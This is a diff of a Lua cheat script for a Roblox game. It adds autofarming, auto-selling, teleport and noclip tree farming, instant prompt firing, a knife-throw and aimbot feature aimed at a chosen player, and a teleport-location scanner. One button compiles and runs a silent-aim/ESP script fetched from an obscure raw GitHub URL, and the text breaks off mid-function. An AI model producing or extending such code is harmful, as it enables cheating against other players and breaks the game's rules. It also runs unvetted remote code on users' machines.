+                Library:Notify("Chest automation off", 2)
+            end
+        end,
+    })
+    pcall(function()
+        if Toggles.FentiUnifiedChests then
+            _G.AutoCollect = Toggles.FentiUnifiedChests.Value
+            if Toggles.FentiUnifiedChests.Value then
+                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
+                task.delay(0.12, function()
+                    task.delay(0.1, function()
+                        pcall(function() _G.fentiConnectIYChestInstantPP() end)
+                    end)
+                end)
+            else
+                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
+            end
+        end
+    end)
     FishingLeft:AddDivider()
     FishingLeft:AddLabel("<b>Fishing TP presets</b>", true)
     FishingLeft:AddDropdown("FishSpotPick", {
         Text = "Teleport preset",
         Values = fentiFishSpotDropdownValues(),
-        Default = "Default (hub)",
+        Default = "Default",
         Callback = function(val)
             fentiSelectedFishSpotName = val
             fentiFishSpotsPushToSaveOption()
         end,
     })
     FishingLeft:AddInput("FishSpotNewName", { Text = "New preset name", Default = "My spot", Finished = true })
-    FishingLeft:AddButton({ Text = "Add preset (save stand here)", Func = function()
+    FishingLeft:AddButton({ Text = "Add preset", Func = function()
         refreshCharacter()
         if not humanoidRootPart then Library:Notify("No character.", 3); return end
         local name = Options.FishSpotNewName and Options.FishSpotNewName.Value or ""
         if type(name) ~= "string" or name == "" then name = "Spot " .. (#fentiCustomFishSpotEntries + 1) end
-        if name == "Default (hub)" or name == "Sussy spot" then Library:Notify("That name is reserved for hub presets.", 3); return end
+        if name == "Default" or name == "Sussy spot" then Library:Notify("That name is reserved for presets.", 3); return end
         for _, e in ipairs(fentiCustomFishSpotEntries) do
             if e.name == name then Library:Notify("That name already exists.", 3); return end
         end
@@ -6486,15 +7446,15 @@ do
     end })
     FishingLeft:AddButton({ Text = "Remove selected preset", Func = function()
         local sel = fentiSelectedFishSpotName
-        if sel == "Default (hub)" or sel == "Sussy spot" then Library:Notify("Cannot remove built-in hub fishing spots.", 3); return end
+        if sel == "Default" or sel == "Sussy spot" then Library:Notify("Cannot remove built-in fishing spots.", 3); return end
         for i, e in ipairs(fentiCustomFishSpotEntries) do
             if e.name == sel then table.remove(fentiCustomFishSpotEntries, i); break end
         end
-        fentiSelectedFishSpotName = "Default (hub)"
+        fentiSelectedFishSpotName = "Default"
         pcall(function()
             if Options.FishSpotPick then
                 Options.FishSpotPick:SetValues(fentiFishSpotDropdownValues())
-                Options.FishSpotPick:SetValue("Default (hub)")
+                Options.FishSpotPick:SetValue("Default")
             end
         end)
         fentiFishSpotsPushToSaveOption()
@@ -6509,6 +7469,7 @@ do
     end })
     FishingLeft:AddButton({ Text = "STOP fishing", Func = function()
         isRunning = false
+        rawset(_G, "fentiFishingReturnCFrame", nil)
         _G.fentiFishingNoSnap = nil
         if _G.fentiStopFishingPoseHold then pcall(_G.fentiStopFishingPoseHold) end
         _G.fentiFishAssistFiredGen = nil
@@ -6518,24 +7479,393 @@ do
         Library:Notify("Stopped.", 3)
     end })
     
-    FishingShop:AddButton({ Text = "Buy bait (15 Moola)", Func = function() danielAction("Buy_Bait_15"); Library:Notify("Buying bait…", 3) end })
-    FishingShop:AddButton({ Text = "Buy fishing rod (150 Moola)", Func = function() danielAction("Buy_FishingRod_150"); Library:Notify("Buying rod…", 3) end })
+    FishingShop:AddButton({ Text = "Buy bait (15 Moola)", Func = function() _G.fentiDanielAction("Buy_Bait_15"); Library:Notify("Buying bait…", 3) end })
+    FishingShop:AddButton({ Text = "Buy fishing rod", Func = function() _G.fentiDanielAction("Buy_FishingRod"); Library:Notify("Buying rod…", 3) end })
     FishingShop:AddToggle("AutoBuyRod", { Text = "Buy rod if missing when starting", Default = false, Callback = function(val) autoBuyRod = val end })
     FishingShop:AddDivider()
-    FishingShop:AddButton({ Text = "Sell all Bass", Func = function() danielAction("SellAll_Bass") end })
-    FishingShop:AddButton({ Text = "Sell all Snapper", Func = function() danielAction("SellAll_Snapper") end })
-    FishingShop:AddButton({ Text = "Sell all Cod", Func = function() danielAction("SellAll_Cod") end })
+    FishingShop:AddButton({ Text = "Sell all Bass", Func = function() _G.fentiDanielSellRemote("SellAll_Bass") end })
+    FishingShop:AddButton({ Text = "Sell all Snapper", Func = function() _G.fentiDanielSellRemote("SellAll_Snapper") end })
+    FishingShop:AddButton({ Text = "Sell all Cod", Func = function() _G.fentiDanielSellRemote("SellAll_Cod") end })
     FishingShop:AddDivider()
-    FishingShop:AddButton({ Text = "Sell ALL fish", Func = function() sellAllFish(); Library:Notify("Sold all.", 3) end })
+    FishingShop:AddButton({ Text = "Sell ALL fish", Func = function() _G.fentiSellAllFish(); Library:Notify("Sold all.", 3) end })
     FishingShop:AddDivider()
     FishingShop:AddSlider("AutoSellDelay", { Text = "Auto-sell every (seconds)", Default = 60, Min = 15, Max = 300, Rounding = 0 })
     FishingShop:AddToggle("AutoSellFish", { Text = "Auto sell all fish", Default = false, Callback = function(s)
         autoSellFish = s
-        if s then Library:Notify("Auto-sell ON", 3); task.spawn(autoSellLoop) else Library:Notify("Auto-sell OFF", 3) end
+        if s then Library:Notify("Auto-sell ON", 3); task.spawn(_G.fentiAutoSellLoop) else Library:Notify("Auto-sell OFF", 3) end
     end })
     FishingShop:AddDivider()
-    FishingShop:AddButton({ Text = "Buy ammo pack", Func = function() buyAmmoPack(); Library:Notify("Buying ammo…", 3) end })
+    FishingShop:AddButton({ Text = "Buy ammo pack", Func = function() _G.fentiBuyAmmoPack(); Library:Notify("Buying ammo…", 3) end })
     end end -- Fishing
+    
+    -- [FENTI-22·autofarm] Horse reroll, lumber axe, tree farm
+    if Tabs.Autofarm then do
+    local treeFarmHalt = true
+    local AFLeft = Tabs.Autofarm:AddLeftGroupbox("Autofarm", "package")
+    local AFTrees = Tabs.Autofarm:AddRightGroupbox("Tree farm", "trees")
+    AFLeft:AddLabel("<b>Horse</b>", true)
+    AFLeft:AddToggle("AutoRollHorse", {
+        Text = "Auto-roll mythical horse",
+        Default = false,
+        Callback = function(v)
+            if v then
+                if _G.fentiHorseRollLoop then _G.fentiHorseRollLoop() end
+            else
+                if _G.fentiHorseRollStop then _G.fentiHorseRollStop() end
+            end
+        end,
+    })
+    AFLeft:AddButton({ Text = "Stop horse roll", Func = function()
+        if _G.fentiHorseRollStop then _G.fentiHorseRollStop() end
+        if Toggles.AutoRollHorse then Toggles.AutoRollHorse:SetValue(false) end
+    end })
+    AFLeft:AddDivider()
+    AFLeft:AddLabel("<b>Lumber</b>", true)
+    AFLeft:AddButton({
+        Text = "Buy lumber axe",
+        Func = function()
+            pcall(function() _G.fentiBuyLumberAxe() end)
+        end,
+    })
+    AFLeft:AddButton({
+        Text = "Sell wood",
+        Func = function()
+            pcall(function() _G.fentiChuckSellWoodRemote() end)
+        end,
+    })
+    AFLeft:AddSlider("AutoSellWoodDelay", {
+        Text = "Auto-sell wood every (sec)",
+        Default = 75,
+        Min = 1,
+        Max = 300,
+        Rounding = 0,
+    })
+    AFLeft:AddToggle("AutoSellWood", {
+        Text = "Auto sell wood (ChuckB)",
+        Default = false,
+        Callback = function(s)
+            autoSellWood = s
+            if s then
+                Library:Notify("Auto sell wood ON", 3)
+                task.spawn(_G.fentiAutoSellWoodLoop)
+            else
+                Library:Notify("Auto sell wood OFF", 2)
+            end
+        end,
+    })
+    AFTrees:AddLabel("autofarms for rokaka seeds / or herbs if swamp trees", true)
+    AFTrees:AddDropdown("TreeFarmRegion", {
+        Text = "Tree folder (Map)",
+        Values = { "ForestTrees", "SwampTrees" },
+        Default = "ForestTrees",
+    })
+    AFTrees:AddToggle("TreeFarmRun", {
+        Text = "Tree farm",
+        Default = false,
+        Callback = function(v)
+            if v then
+                treeFarmHalt = false
+                task.spawn(function()
+                    local restoreNoclip = fentiNoclipEnabled
+                    local function findLumberAxe(container)
+                        if not container then return nil end
+                        for _, t in ipairs(container:GetChildren()) do
+                            if t:IsA("Tool") then
+                                local n = string.lower(t.Name)
+                                if (string.find(n, "lumber", 1, true) and string.find(n, "axe", 1, true))
+                                    or string.find(n, "lumberaxe", 1, true)
+                                    or n == "lumber axe"
+                                    or (string.find(n, "axe", 1, true) and (string.find(n, "wood", 1, true) or string.find(n, "chop", 1, true)))
+                                then
+                                    return t
+                                end
+                            end
+                        end
+                        return nil
+                    end
+                    local function equipAxe()
+                        refreshCharacter()
+                        local hum = character and character:FindFirstChildOfClass("Humanoid")
+                        local bp = player:FindFirstChild("Backpack")
+                        if not hum or not bp then return false end
+                        local tool = findLumberAxe(character) or findLumberAxe(bp)
+                        if not tool then return false end
+                        pcall(function() hum:EquipTool(tool) end)
+                        task.wait(0.12)
+                        return true
+                    end
+                    local function collectTreeTargets(rootFolder)
+                        local out = {}
+                        if not rootFolder then return out end
+                        local cap = 0
+                        local myChar = player.Character
+                        for _, d in ipairs(rootFolder:GetDescendants()) do
+                            if cap >= 400 then break end
+                            if d:IsA("Model") then
+                                if myChar and d:IsDescendantOf(myChar) then
+                                else
+                                    local ok, cf, sz = pcall(function() return d:GetBoundingBox() end)
+                                    if ok and cf and typeof(sz) == "Vector3" then
+                                        local mag = sz.Magnitude
+                                        -- Real trees: trunk volume; skip map folders / empty / whole-map bounds.
+                                        if mag > 2.5 and mag < 900 and sz.Y > 2 and sz.Y < 220 then
+                                            out[#out + 1] = d
+                                            cap = cap + 1
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        if #out == 0 then
+                            for _, ch in ipairs(rootFolder:GetChildren()) do
+                                if ch:IsA("Model") and (not myChar or not ch:IsDescendantOf(myChar)) then
+                                    local ok, _, sz = pcall(function() return ch:GetBoundingBox() end)
+                                    if ok and typeof(sz) == "Vector3" and sz.Magnitude > 2 and sz.Magnitude < 900 and sz.Y < 220 then
+                                        out[#out + 1] = ch
+                                    end
+                                elseif ch:IsA("BasePart") then
+                                    out[#out + 1] = ch
+                                end
+                            end
+                        end
+                        return out
+                    end
+                    local function resolveTreeFolder(folderName)
+                        if not folderName or folderName == "" then return nil end
+                        local map = workspace:FindFirstChild("Map")
+                        if map then
+                            local f = map:FindFirstChild(folderName)
+                            if f and (f:IsA("Folder") or f:IsA("Model")) then return f end
+                        end
+                        local direct = workspace:FindFirstChild(folderName)
+                        if direct then return direct end
+                        return nil
+                    end
+                    local function treeBarkPart(treeModel)
+                        if not treeModel or not treeModel:IsA("Model") then return nil end
+                        local bark = treeModel:FindFirstChild("TreeBark", true) or treeModel:FindFirstChild("Bark", true)
+                        if bark and bark:IsA("BasePart") then return bark end
+                        return nil
+                    end
+                    local function treeHasLiveBark(treeModel)
+                        if not treeModel or not treeModel:IsA("Model") then return false end
+                        local b = treeBarkPart(treeModel)
+                        return b ~= nil and b.Parent ~= nil
+                    end
+                    local function collectFolderRootTrees(rootFolder)
+                        local out = {}
+                        if not rootFolder then return out end
+                        local myChar = player.Character
+                        for _, ch in ipairs(rootFolder:GetChildren()) do
+                            if ch:IsA("Model") and ch.Parent == rootFolder and (not myChar or not ch:IsDescendantOf(myChar)) and treeHasLiveBark(ch) then
+                                out[#out + 1] = ch
+                            end
+                        end
+                        return out
+                    end
+                    local function treeFarmUnanchorHrp()
+                        refreshCharacter()
+                        if humanoidRootPart then pcall(function() humanoidRootPart.Anchored = false end) end
+                    end
+                    local function treeFarmAnchorHrp()
+                        refreshCharacter()
+                        if humanoidRootPart then pcall(function() humanoidRootPart.Anchored = true end) end
+                    end
+                    local function treeFarmSnapPosOnly(pos)
+                        refreshCharacter()
+                        if not humanoidRootPart or not pos then return end
+                        pcall(function() humanoidRootPart.CFrame = CFrame.new(pos) end)
+                    end
+                    local function treeFarmClickCenter()
+                        if not VIM then return end
+                        local cam = workspace.CurrentCamera
+                        if not cam then return end
+                        local vp = cam.ViewportSize
+                        local cx = vp.X / 2
+                        local cy = vp.Y / 2
+                        pcall(function() VIM:SendMouseButtonEvent(cx, cy, 0, true, false, 1) end)
+                        task.wait(0.04)
+                        pcall(function() VIM:SendMouseButtonEvent(cx, cy, 0, false, false, 1) end)
+                    end
+                    local function promptWorldPos(pp)
+                        if not pp or not pp:IsA("ProximityPrompt") then return nil end
+                        local par = pp.Parent
+                        if par and par:IsA("BasePart") then return par.Position end
+                        if par and par:IsA("Attachment") then return par.WorldPosition end
+                        return nil
+                    end
+                    local function isChestProximity(pp)
+                        local p = pp and pp.Parent
+                        while p and p ~= game do
+                            if p.Name == "ChestBox" then return true end
+                            p = p.Parent
+                        end
+                        return false
+                    end
+                    local function nearestNonChestPrompt(center, maxDist)
+                        local md2 = maxDist * maxDist
+                        local best, bestD2 = nil, md2
+                        local budget = 0
+                        for _, inst in ipairs(workspace:GetDescendants()) do
+                            budget = budget + 1
+                            if budget > 2200 then break end
+                            if inst:IsA("ProximityPrompt") and inst.Enabled and not isChestProximity(inst) then
+                                local pw = promptWorldPos(inst)
+                                if pw then
+                                    local dx = pw.X - center.X
+                                    local dy = pw.Y - center.Y
+                                    local dz = pw.Z - center.Z
+                                    local d2 = dx * dx + dy * dy + dz * dz
+                                    if d2 < bestD2 then bestD2, best = d2, inst end
+                                end
+                            end
+                        end
+                        return best
+                    end
+                    -- Prefer TreeBark / Bark (game layout: Map.ForestTrees.ForestTree1.TreeBark).
+                    local function treeMiddleWorldPos(treeInst)
+                        if treeInst:IsA("Model") then
+                            local bark = treeBarkPart(treeInst)
+                            if bark then
+                                local inward = Vector3.zero
+                                local okBox, treeCf = pcall(function() return treeInst:GetBoundingBox() end)
+                                if okBox and treeCf and typeof(treeCf) == "CFrame" then
+                                    local ctr = treeCf.Position
+                                    local delta = ctr - bark.Position
+                                    local m = delta.Magnitude
+                                    if m > 0.08 then
+                                        inward = delta.Unit * math.clamp(m * 0.18, 0.35, 2.4)
+                                    end
+                                end
+                                local pos = bark.Position + inward + Vector3.new(0, math.clamp(bark.Size.Y * 0.06, 0.15, 1.8), 0)
+                                return pos, bark.Size
+                            end
+                            local ok, cf, sz = pcall(function() return treeInst:GetBoundingBox() end)
+                            if ok and cf and typeof(sz) == "Vector3" then
+                                local mid = cf.Position
+                                local yLift = math.clamp(sz.Y * 0.12, 0.8, 6)
+                                return mid + Vector3.new(0, yLift, 0), sz
+                            end
+                            local ok2, piv = pcall(function() return treeInst:GetPivot() end)
+                            if ok2 and piv then return piv.Position + Vector3.new(0, 2, 0), Vector3.new(6, 12, 6) end
+                        elseif treeInst:IsA("BasePart") then
+                            return treeInst.Position + Vector3.new(0, treeInst.Size.Y * 0.35, 0), treeInst.Size
+                        end
+                        return nil, nil
+                    end
+                    while not treeFarmHalt do
+                        if not equipAxe() then
+                            pcall(function() fentiSetNoclip(restoreNoclip) end)
+                            Library:Notify("Need Lumber Axe — use Buy lumber axe.", 5)
+                            treeFarmHalt = true
+                            break
+                        end
+                        local folderName = (Options.TreeFarmRegion and Options.TreeFarmRegion.Value) or "ForestTrees"
+                        local folder = resolveTreeFolder(folderName)
+                        if not folder then
+                            task.wait(1.2)
+                        else
+                            local folderTrees = collectFolderRootTrees(folder)
+                            if #folderTrees == 0 then
+                                for _, t in ipairs(collectTreeTargets(folder)) do
+                                    if t:IsA("Model") and t.Parent == folder and treeHasLiveBark(t) then
+                                        folderTrees[#folderTrees + 1] = t
+                                    end
+                                end
+                            end
+                            if #folderTrees == 0 then
+                                task.wait(1)
+                            else
+                                treeFarmUnanchorHrp()
+                                local treeInst = folderTrees[math.random(1, #folderTrees)]
+                                pcall(function() fentiSetNoclip(true) end)
+                                local firstPos = select(1, treeMiddleWorldPos(treeInst))
+                                if firstPos then
+                                    smartTeleport(CFrame.new(firstPos))
+                                    task.wait(0.14)
+                                    refreshCharacter()
+                                    treeFarmAnchorHrp()
+                                    local expBreakOn = rawget(_G, "FENTI_TREE_FARM_USE_EXP_BREAK") ~= false
+                                    local expNotifsNeeded = rawget(_G, "FENTI_TREE_EXP_NOTIFS_TO_BREAK")
+                                    if type(expNotifsNeeded) ~= "number" then expNotifsNeeded = 1 end
+                                    local expNotifCount0 = (expBreakOn and (rawget(_G, "fentiExpNotifCount") or 0)) or 0
+                                    local useLsExp = rawget(_G, "FENTI_TREE_FARM_EXP_USE_LEADERSTATS") == true
+                                    local expMinDelta = rawget(_G, "FENTI_TREE_FARM_EXP_MIN_DELTA")
+                                    if type(expMinDelta) ~= "number" then expMinDelta = 1 end
+                                    local expAtTreeStart = (expBreakOn and useLsExp and fentiGetExpTotal()) or nil
+                                    while not treeFarmHalt and treeInst.Parent == folder and treeHasLiveBark(treeInst) do
+                                        local pos = select(1, treeMiddleWorldPos(treeInst))
+                                        if not pos then break end
+                                        treeFarmSnapPosOnly(pos)
+                                        task.wait(0.06)
+                                        refreshCharacter()
+                                        if not humanoidRootPart then
+                                            task.wait(0.25)
+                                            break
+                                        end
+                                        equipAxe()
+                                        pcall(fentiLumberAxeUseToolSwingRelease)
+                                        local hum = character and character:FindFirstChildOfClass("Humanoid")
+                                        local equipped = hum and hum:FindFirstChildWhichIsA("Tool")
+                                        if equipped then
+                                            pcall(function() equipped:Activate() end)
+                                            task.wait(0.04)
+                                            pcall(function() equipped:Activate() end)
+                                            treeFarmClickCenter()
+                                        end
+                                        if humanoidRootPart then
+                                            pcall(function() patchNearbyPrompts(humanoidRootPart.Position, 90) end)
+                                        end
+                                        local pr = treeInst:FindFirstChildWhichIsA("ProximityPrompt", true)
+                                        if not pr and humanoidRootPart then
+                                            pr = nearestNonChestPrompt(humanoidRootPart.Position, 48)
+                                        end
+                                        if pr and _G.fentiFireChestProximityInstant then
+                                            pcall(_G.fentiFireChestProximityInstant, pr)
+                                            task.wait(0.06)
+                                            pcall(_G.fentiFireChestProximityInstant, pr)
+                                        end
+                                        if expBreakOn then
+                                            local c = rawget(_G, "fentiExpNotifCount") or 0
+                                            if c >= expNotifCount0 + expNotifsNeeded then
+                                                break
+                                            end
+                                            if expAtTreeStart ~= nil then
+                                                local expNow = fentiGetExpTotal()
+                                                if expNow ~= nil and expNow >= expAtTreeStart + expMinDelta then
+                                                    break
+                                                end
+                                            end
+                                        end
+                                        task.wait(0.1)
+                                    end
+                                end
+                                treeFarmUnanchorHrp()
+                                task.wait(0.4)
+                            end
+                        end
+                        task.wait(0.2)
+                    end
+                    pcall(function()
+                        refreshCharacter()
+                        if humanoidRootPart then humanoidRootPart.Anchored = false end
+                    end)
+                    pcall(function() fentiSetNoclip(restoreNoclip) end)
+                    pcall(function()
+                        if Toggles.TreeFarmRun then Toggles.TreeFarmRun:SetValue(false) end
+                    end)
+                    treeFarmHalt = true
+                end)
+            else
+                treeFarmHalt = true
+                pcall(function()
+                    refreshCharacter()
+                    if humanoidRootPart then humanoidRootPart.Anchored = false end
+                end)
+            end
+        end,
+    })
+    end end -- Autofarm
     
     -- [FENTI-22·saints] Saints sniper farm (monitor + soft TP)
     if Tabs.Saints then do
@@ -6551,6 +7881,7 @@ do
         end,
     })
     SaintsFarm:AddDivider()
+    SaintsFarm:AddLabel("Corpse sniper: enable <b>Instant corpse + saints</b> below.", true)
     SaintsFarm:AddToggle("SaintsAutoFarm", {
         Text = "Auto pickup saints",
         Default = false,
@@ -6565,10 +7896,27 @@ do
             end
         end,
     })
-    SaintsFarm:AddToggle("InstantPromptSaints", {
-        Text = "Auto-hold prompt key",
+    SaintsFarm:AddToggle("FentiUnifiedLootPrompts", {
+        Text = "Instant pickup",
         Default = false,
+        Callback = function(v)
+            if v then
+                pcall(function() _G.fentiDisconnectIYLootInstantPP() end)
+                task.delay(0.12, function()
+                    pcall(function() _G.fentiConnectIYLootInstantPP() end)
+                end)
+            else
+                pcall(function() _G.fentiDisconnectIYLootInstantPP() end)
+            end
+        end,
     })
+    pcall(function()
+        if Toggles.FentiUnifiedLootPrompts and Toggles.FentiUnifiedLootPrompts.Value then
+            task.delay(0.35, function()
+                pcall(function() _G.fentiConnectIYLootInstantPP() end)
+            end)
+        end
+    end)
     SaintsFarm:AddToggle("SaintsFullAuto", {
         Text = "Full auto (everything on)",
         Default = false,
@@ -6581,7 +7929,10 @@ do
                     if Toggles.SaintsPartEsp then Toggles.SaintsPartEsp:SetValue(true) end
                 end)
                 pcall(function()
-                    if Toggles.InstantPromptSaints then Toggles.InstantPromptSaints:SetValue(true) end
+                    if Toggles.FentiUnifiedLootPrompts then Toggles.FentiUnifiedLootPrompts:SetValue(true) end
+                end)
+                task.defer(function()
+                    pcall(function() _G.fentiConnectIYLootInstantPP() end)
                 end)
                 pcall(function()
                     if Toggles.SaintsAutoFarm and not Toggles.SaintsAutoFarm.Value then
@@ -6653,7 +8004,7 @@ do
     if Tabs.D4CFarm then do
     local D4CLeft = Tabs.D4CFarm:AddLeftGroupbox("D4C farm", "swords")
     D4CLeft:AddDivider()
-    D4CLeft:AddLabel("<i>Auto knock / knives — thanks ivan for the base script.</i>", true)
+    D4CLeft:AddLabel("<i>Auto knock - thanks ivan for the script.</i>", true)
     D4CLeft:AddDivider()
 
     local d4cSelectedPlayer = nil
@@ -6904,7 +8255,10 @@ do
     end)
 
     task.spawn(function()
-        while task.wait(0.1) do
+        while true do
+            local knifeOn = Toggles and Toggles.D4CKnifeThrow and Toggles.D4CKnifeThrow.Value and d4cSelectedPlayer and d4cSelectedPlayer.Parent
+            local aimOn = Toggles and Toggles.D4CAimbot and Toggles.D4CAimbot.Value
+            task.wait((knifeOn or aimOn) and 0.12 or 0.45)
             if d4cKnivesLabel then
                 d4cKnivesLabel:SetText(string.format("Knives left: %d", d4cGetKnivesCount()))
             end
@@ -6939,10 +8293,10 @@ do
     if Tabs.Aimbot then do
     local FENTI_EXTERNAL_AIMBOT_URL = "https://raw.githubusercontent.com/vbbi33jkllljcvvbjkqw89fjjkjhkjzsdaih/dddvbk34vb/refs/heads/main/Aimboitsilentdih.lua"
     local AimbotBox = Tabs.Aimbot:AddLeftGroupbox("External loader", "shield")
-    AimbotBox:AddLabel("Experimental — use at your own risk. Needs a capable executor.", true)
+    AimbotBox:AddLabel("Experimental — use at your own risk. Needs a capable executor. e.g volt", true)
     AimbotBox:AddDivider()
     AimbotBox:AddButton({
-        Text = "Load external aimbot / ESP",
+        Text = "Load external silent aim / ESP",
         Func = function()
             if rawget(_G, "fentiExternalAimbotLoaded") == true then
                 Library:Notify(" aimbot already loaded", 4)
@@ -6975,13 +8329,13 @@ do
                 end
                 if type(chunk) ~= "function" then
                     Library:Notify("Compile failed — check F9 Output.", 5)
-                    warn("[fenti] external aimbot compile: " .. tostring(cerr))
+                    warn("aimbot failed")
                     return
                 end
                 local okRun, runErr = pcall(chunk)
                 if not okRun then
                     Library:Notify("Runtime error: " .. tostring(runErr):sub(1, 120), 6)
-                    warn("[fenti] external aimbot run: " .. tostring(runErr))
+                    warn("aimbot failed")
                     return
                 end
                 rawset(_G, "fentiExternalAimbotLoaded", true)
@@ -7000,82 +8354,224 @@ do
     end })
     TPLocations:AddButton({ Text = "Safe zone", Func = function() smartTeleport(SAFE_ZONE_POS); Library:Notify("Done.", 2) end })
     TPLocations:AddDivider()
-    Labels.ChestCount = TPLocations:AddLabel("Opened: 0 / 0  |  Left: 0")
-    Labels.ChestServer = TPLocations:AddLabel("Chests in server: 0")
-    TPLocations:AddToggle("ChestFarmToggle", {
-        Text = "Run chest farm",
-        Default = false,
-        Callback = function(s)
-            chestFarmEnabled = s
-            if s then
-                refreshCharacter()
-                originalPosition = humanoidRootPart and humanoidRootPart.Position or nil
-                lockRootMotion()
-                startTPLoop()
-                task.spawn(function()
-                    pcall(function() _G.FentiFarm.chestFarmLoop() end)
-                end)
-                Library:Notify("Chest farm ON", 3)
-            else
-                stopTPLoop()
-                unlockRootMotion()
-                Library:Notify("Chest farm OFF", 3)
-            end
-        end,
-    })
-    TPLocations:AddToggle("ChestServerhop", { Text = "Serverhop if no chests / all opened", Default = false })
-    TPLocations:AddSlider("ChestTPDelay", { Text = "Pause after each chest (s)", Default = 5, Min = 1, Max = 20, Rounding = 0 })
-    
-    local TPWorld = Tabs.Teleport:AddRightGroupbox("Prompts", "hand")
-    TPWorld:AddToggle("AutoCollectChests", { Text = "Auto open chests nearby", Default = true, Callback = function(v)
-        _G.AutoCollect = v
-        Library:Notify(v and "Chests on" or "Chests off", 2)
-    end })
-    TPWorld:AddToggle("InstantPromptChest", {
-        Text = "Instant chest open",
-        Default = true,
-        Callback = function(v)
-            if v then
-                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
-                task.delay(0.1, function()
-                    local ok = false
-                    pcall(function() ok = _G.fentiConnectIYChestInstantPP() == true end)
-                    if ok then
-                        Library:Notify("Instant chests on", 2)
-                    else
-                        Library:Notify("Instant chests on (fallback)", 3)
+    local function fentiResolveWorkspacePath(pathStr)
+        local cur = workspace
+        for part in string.gmatch(pathStr, "[^/]+") do
+            cur = cur:FindFirstChild(part)
+            if not cur then return nil end
+        end
+        return cur
+    end
+    local function fentiInstToTeleportCF(inst)
+        if not inst then return nil end
+        local cf
+        pcall(function()
+            if inst:IsA("SpawnLocation") or inst:IsA("BasePart") then cf = inst.CFrame
+            elseif inst:IsA("Model") then cf = inst:GetPivot()
+            elseif inst:IsA("Folder") then
+                local sum, n = Vector3.zero, 0
+                for _, ch in ipairs(inst:GetChildren()) do
+                    if n >= 16 then break end
+                    if ch:IsA("BasePart") then sum = sum + ch.Position; n = n + 1
+                    elseif ch:IsA("Model") then
+                        local ok, p = pcall(function() return ch:GetPivot().Position end)
+                        if ok and p then sum = sum + p; n = n + 1 end
                     end
-                end)
-            else
-                pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
-                Library:Notify("Instant chests off", 2)
+                end
+                if n > 0 then cf = CFrame.new(sum / n) end
             end
-        end,
-    })
-    pcall(function()
-        if Toggles.AutoCollectChests then _G.AutoCollect = Toggles.AutoCollectChests.Value end
-    end)
-    pcall(function()
-        if Toggles.InstantPromptChest and Toggles.InstantPromptChest.Value then
-            pcall(function() _G.fentiDisconnectIYChestInstantPP() end)
-            task.delay(0.12, function()
-                task.delay(0.1, function()
-                    pcall(function() _G.fentiConnectIYChestInstantPP() end)
+        end)
+        return cf
+    end
+    local function fentiNicePlaceLabel(s)
+        if type(s) ~= "string" then return "Place" end
+        s = s:gsub("_", " ")
+        s = s:gsub("([a-z])([A-Z])", "%1 %2")
+        return s
+    end
+    local function fentiRefreshQuickTPValues()
+        local counts = {}
+        local lookup = {}
+        local order = {}
+        local function addPlace(baseLabel, getCF)
+            local c = (counts[baseLabel] or 0) + 1
+            counts[baseLabel] = c
+            local label = (c == 1) and baseLabel or (baseLabel .. " (" .. c .. ")")
+            lookup[label] = getCF
+            order[#order + 1] = label
+        end
+        addPlace("Safe zone", function() return SAFE_ZONE_POS end)
+        addPlace("Fishing spot", function() return fentiGetFishSpotCFrame() end)
+        local landmarks = { "LumberHouse", "ForestTrees", "SwampTrees" }
+        for _, name in ipairs(landmarks) do
+            if workspace:FindFirstChild(name) then
+                local nm = fentiNicePlaceLabel(name)
+                addPlace(nm, function()
+                    local inst = workspace:FindFirstChild(name)
+                    local cf = fentiInstToTeleportCF(inst)
+                    return cf and cf * CFrame.new(0, 4, 0) or nil
                 end)
+            end
+        end
+        local spawnSeen = {}
+        local function registerSpawnPath(relPath)
+            if spawnSeen[relPath] then return end
+            spawnSeen[relPath] = true
+            local leaf = string.match(relPath, "[^/]+$") or relPath
+            addPlace(fentiNicePlaceLabel(leaf), function()
+                local inst = fentiResolveWorkspacePath(relPath)
+                local cf = fentiInstToTeleportCF(inst)
+                return cf and cf * CFrame.new(0, 3, 0) or nil
             end)
         end
-    end)
+        local function scanSpawnFolder(folder, prefix, depthLeft)
+            if not folder or depthLeft <= 0 then return end
+            for _, ch in ipairs(folder:GetChildren()) do
+                if ch:IsA("SpawnLocation") or ch:IsA("Model") or ch:IsA("BasePart") then
+                    registerSpawnPath(prefix .. "/" .. ch.Name)
+                elseif ch:IsA("Folder") then
+                    scanSpawnFolder(ch, prefix .. "/" .. ch.Name, depthLeft - 1)
+                end
+            end
+        end
+        local spawnRootNames = {
+            "Spawns", "SpawnLocations", "SpawnPoints", "RespawnPoints", "Checkpoints",
+            "TeleportSpawns", "PlayerSpawns", "Spawn", "SpawnAreas",
+        }
+        for _, rn in ipairs(spawnRootNames) do
+            local root = workspace:FindFirstChild(rn)
+            if root and (root:IsA("Folder") or root:IsA("Model")) then
+                scanSpawnFolder(root, rn, 4)
+            end
+        end
+        for _, ch in ipairs(workspace:GetChildren()) do
+            if (ch:IsA("Folder") or ch:IsA("Model")) and string.find(string.lower(ch.Name), "spawn", 1, true) then
+                local already = false
+                for _, rn in ipairs(spawnRootNames) do
+                    if ch.Name == rn then already = true; break end
+                end
+                if not already then scanSpawnFolder(ch, ch.Name, 3) end
+            end
+        end
+        for _, mapName in ipairs({ "Map", "World" }) do
+            local map = workspace:FindFirstChild(mapName)
+            if map then
+                for _, rn in ipairs(spawnRootNames) do
+                    local sub = map:FindFirstChild(rn)
+                    if sub and (sub:IsA("Folder") or sub:IsA("Model")) then
+                        scanSpawnFolder(sub, mapName .. "/" .. rn, 3)
+                    end
+                end
+            end
+        end
+        local looseCap = 0
+        for _, d in ipairs(workspace:GetDescendants()) do
+            if looseCap >= 28 then break end
+            if d:IsA("SpawnLocation") then
+                local chain = d.Name
+                local p = d.Parent
+                local steps = 0
+                while p and p ~= workspace and steps < 5 do
+                    chain = p.Name .. "/" .. chain
+                    p = p.Parent
+                    steps = steps + 1
+                end
+                registerSpawnPath(chain)
+                looseCap = looseCap + 1
+            end
+        end
+        rawset(_G, "fentiQuickTPLookup", lookup)
+        table.sort(order)
+        return order
+    end
+    TPLocations:AddDropdown("QuickTPLocation", {
+        Text = "Quick place",
+        Values = fentiRefreshQuickTPValues(),
+        Default = nil,
+        AllowNull = true,
+        Searchable = true,
+    })
+    TPLocations:AddButton({
+        Text = "Teleport to quick place",
+        Func = function()
